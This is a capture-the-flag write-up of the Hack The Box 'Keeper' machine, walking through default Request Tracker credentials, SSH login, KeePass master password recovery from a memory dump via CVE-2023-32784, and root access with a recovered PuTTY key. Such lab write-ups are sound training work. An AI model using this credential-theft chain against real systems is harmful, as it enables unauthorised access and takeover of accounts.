# Hack The Box — Keeper

> **Difficulty:** Easy  
> **OS:** Linux  
> **IP:** `10.129.229.41`  
> **Domain:** `tickets.keeper.htb`

---

# 1. Initial Recon

## Nmap

I started with a full TCP port scan using default scripts and service/version detection:

```
nmap -sC -sV -p- --min-rate=1000 10.129.229.41
```

The scan identified two open ports:

```
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3
80/tcp open  http    nginx 1.18.0 (Ubuntu)
```

The target was running SSH and an nginx web server.

I added the target hostname to `/etc/hosts`:

```
echo "10.129.229.41 tickets.keeper.htb" | sudo tee -a /etc/hosts
```

# 2. Web Enumeration — Request Tracker

## Identifying the Application

I navigated to `http://tickets.keeper.htb` and identified the application as **Best Practical Request Tracker (RT) version 4.4.4**.

I performed a quick search for the default Request Tracker credentials. The documentation indicated that the default login was:

```
Username: root
Password: password
```

I tried these credentials and successfully logged in, landing on the Request Tracker dashboard.

## Enumerating Users

After logging in, I navigated to:

```
Admin → Users
```

The user list contained two enabled accounts:

|ID|Username|Real Name|Email|
|---|---|---|---|
|27|`lnorgaard`|Lise Nørgaard|`lnorgaard@keeper.htb`|
|14|`root`|Enoch Root|`root@localhost`|

I selected the `lnorgaard` account and inspected its configuration.

The account's initial password was set to:

```
Welcome2023!
```

This gave me a set of credentials to test against the SSH service.

# 3. Initial Access — SSH as lnorgaard

I first attempted to connect using an incorrect target IP:

```
ssh lnorgaard@10.10.11.227
```

The connection failed because the host was unreachable.

I corrected the address and connected to the actual target:

```
ssh lnorgaard@10.129.229.41
```

Using the password discovered in Request Tracker, I successfully authenticated.

The login banner identified the system as Ubuntu 22.04.3 LTS.

I inspected the home directory:

```
ls
```

The output revealed two interesting files:

```
RT30000.zip
user.txt
```

The archive was particularly interesting because it appeared alongside the user flag.

# 4. Credential Discovery — KeePass

## Extracting the Archive

I extracted `RT30000.zip`:

```
unzip RT30000.zip
```

The archive contained two files of interest:

```
KeePassDumpFull.dmp
passcodes.kdbx
```

The first file was a memory dump, while the second was a KeePass password database.

I downloaded both files to my local machine using SCP:

```
scp lnorgaard@10.129.229.41:KeePassDumpFull.dmp .
```

```
scp lnorgaard@10.129.229.41:passcodes.kdbx .
```

The memory dump was approximately 242 MB, while the KeePass database was only a few kilobytes.

## Identifying CVE-2023-32784

A search for `KeePassDumpFull.dmp` led me to **CVE-2023-32784**, a vulnerability affecting KeePass.

The vulnerability allows an attacker with access to a process memory dump to recover password characters from the KeePass master password.

The recovered characters can be incomplete, but they may provide enough information to reconstruct the original password.

I used the following proof-of-concept project:

[keepass-password-dumper](https://github.com/vdohney/keepass-password-dumper)

## Installing the Required Runtime

The proof of concept required the .NET 7 runtime.

I installed it using:

```
sudo apt update
sudo apt install dotnet-runtime-7.0
```

I then cloned the repository and ran the tool against the memory dump.

## Recovering the Master Password

The tool produced a list of password candidates for each character position:

```
Password candidates (character positions):
Unknown characters are displayed as "●"

1.:  ●
2.:  ø, Ï, ,, l, `, -, ', ], §, A, I, :, =, _, c, M
3.:  d
4.:  g
5.:  r
6.:  ø
7.:  d
8.:  [space]
9.:  m
10.: e
11.: d
12.: [space]
13.: f
14.: l
15.: ø
16.: d
17.: e

Combined:
●{ø, Ï, ,, l, `, -, ', ], §, A, I, :, =, _, c, M}dgrød med fløde
```

The output suggested that the password contained the phrase:

```
dgrød med fløde
```

However, the first characters were not fully recovered, so I needed to reconstruct the complete password.

A search for the phrase led me to the Danish expression:

```
rødgrød med fløde
```

This was the missing piece.

# 5. Accessing the KeePass Database

## Installing kpcli

To inspect the KeePass database from the terminal, I installed `kpcli`, a command-line interface for KeePass databases:

```
sudo apt-get install kpcli -y
```

I launched it:

```
kpcli
```

Then I attempted to open the database using the initially reconstructed password:

```
kpcli:/> open passcodes.kdbx
```

The attempt failed because the password was incomplete.

After reconstructing the full Danish phrase, I tried again:

```
kpcli:/> open passcodes.kdbx
```

This time, the database opened successfully with:

```
rødgrød med fløde
```

## Enumerating Stored Credentials

I listed the database contents:

```
kpcli:/> ls
```

The database contained a group named `passcodes`:

```
= Groups =
passcodes/
```

I navigated into it:

```
kpcli:/> cd passcodes
kpcli:/passcodes> ls
```

The group contained several categories:

```
= Groups =
eMail/
General/
Homebanking/
Internet/
Network/
Recycle Bin/
Windows/
```

The `Network` group looked particularly interesting, so I inspected it:

```
kpcli:/passcodes> cd Network
kpcli:/passcodes/Network> ls
```

It contained an entry named:

```
keeper.htb (Ticketing Server)
```

I displayed the entry:

```
kpcli:/passcodes/Network> show 0 -f
```

The entry revealed the following information:

```
Title: keeper.htb (Ticketing Server)
Uname: root
Pass: F4><3K0nd!
URL:
Notes: PuTTY-User-Key-File-3: ssh-rsa
Encryption: none
Comment: rsa-key-20230519
```

The notes also contained a complete PuTTY private key.

This gave me both a root password and an SSH private key.

# 6. Root Access — SSH Private Key

## Converting the PuTTY Key

I copied the private key from the KeePass entry into a local file named `ssh_key`.

Since the key was in PuTTY format, I converted it into OpenSSH format using `puttygen`:

```
puttygen ssh_key -O private-openssh -o id_rsa
```

I then restricted the permissions on the converted key:

```
chmod 600 id_rsa
```

## Connecting as Root

With the converted private key, I connected to the target as root:

```
ssh root@tickets.keeper.htb -i id_rsa
```

The connection succeeded, and I received a root shell:

```
Welcome to Ubuntu 22.04.3 LTS
root@keeper:~#
```

I confirmed access to the root home directory:

```
ls
```

```
root.txt
RT30000.zip
SQL
```

The root flag was located in `/root/root.txt`.

---

# Attack Chain

1. **Reconnaissance:** Identified SSH and nginx running on the target.
    
2. **Application Discovery:** Found Best Practical Request Tracker version 4.4.4.
    
3. **Default Credentials:** Logged in to Request Tracker using the default `root:password` credentials.
    
4. **User Enumeration:** Discovered the `lnorgaard` account and its initial password, `Welcome2023!`.
    
5. **SSH Access:** Authenticated as `lnorgaard` over SSH.
    
6. **File Discovery:** Found `RT30000.zip`, containing a KeePass memory dump and database.
    
7. **Password Recovery:** Exploited CVE-2023-32784 to recover the KeePass master password.
    
8. **Credential Discovery:** Opened the KeePass database and retrieved the root SSH private key.
    
9. **Key Conversion:** Converted the PuTTY private key into OpenSSH format.
    
10. **Root Access:** Authenticated as root using the recovered private key.
    

# Vulnerabilities

|Vulnerability|Description|
|---|---|
|Default Credentials|Request Tracker allowed login using the default `root:password` credentials.|
|Credential Exposure|The Request Tracker user configuration exposed the initial password for `lnorgaard`.|
|Sensitive File Exposure|The user's home directory contained an archive with a KeePass database and process memory dump.|
|CVE-2023-32784|KeePass memory dump analysis allowed recovery of master password characters.|
|SSH Key Exposure|The KeePass database contained a root SSH private key.|

# Key Takeaways

- Always test default credentials when identifying web applications.
    
- Administrative dashboards can expose useful information about users and their account configurations.
    
- Inspect files in user home directories, especially archives and database backups.
    
- Memory dumps can contain sensitive information, including fragments of passwords.
    
- KeePass databases should be protected alongside their associated memory dumps.
    
- Password managers may contain credentials and private keys that provide access to critical systems.
    
- Private keys stored in password databases should be treated as highly sensitive credentials.
    

# Flags

|Flag|Location|User|
|---|---|---|
|User|`/home/lnorgaard/user.txt`|`lnorgaard`|
|Root|`/root/root.txt`|`root`|